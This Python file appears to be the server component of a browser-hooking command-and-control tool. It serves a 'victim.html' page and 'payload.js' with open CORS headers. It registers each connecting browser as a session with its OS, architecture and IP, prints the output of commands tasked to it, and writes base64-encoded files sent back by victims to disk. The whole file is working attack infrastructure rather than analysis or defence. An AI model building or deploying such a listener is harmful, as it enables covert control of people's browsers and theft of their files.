from core.browser_server.base_browser_server import app, socketio
from flask import render_template, request, make_response
from core.sessions import Sessions
from core.utils.printer import *
import base64
import random
import string

@socketio.on('connect')
def connect():
	pass

@socketio.on('new session')
def new_session(data):
	session = Sessions()
	session.add_session(data['arch'], data['os'], data['version'] ,'javascript', request.remote_addr, request.environ.get('REMOTE_PORT'), request.sid)

@socketio.on('get_data')
def get_data(data):
	extension = data['extension']
	value = data['value']
	if value:
		if not extension:
			print_info(value)
		else:
			value = value.split("base64,")
			output_string = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(10))
			with open('output/'+output_string+extension, 'wb') as f:
				f.write(base64.b64decode(value[1]))
			f.close()

@socketio.on('task_output_cmd')
def task_output_cmd(message):

	if message['output'] != 'undefined':
		print_info(message['output'])

@socketio.on('task_output')
def task_output(message):
	return message['output']

@socketio.on('disconnect')
def disconnect():
	session = Sessions()
	session.delete_web_session(request.sid)

@app.route('/')
def index():
	host = request.environ.get('HTTP_HOST')
	r = make_response(render_template('victim.html', host=host))
	r.headers.add('Access-Control-Allow-Origin', '*')
	r.headers.add('crossOrigin', 'Anonymous')
	return r

@app.route('/payload.js')
def payloadjs():
	return open('core/browser_server/templates/payload.js').read()

@app.route('/includes.js')
def includesjs():
	return open('core/browser_server/templates/includes.js').read()
	
def init(port_to_start):
	try:
		socketio.run(app, host='0.0.0.0', port=port_to_start)
	except OSError as e:
		print_error(e)
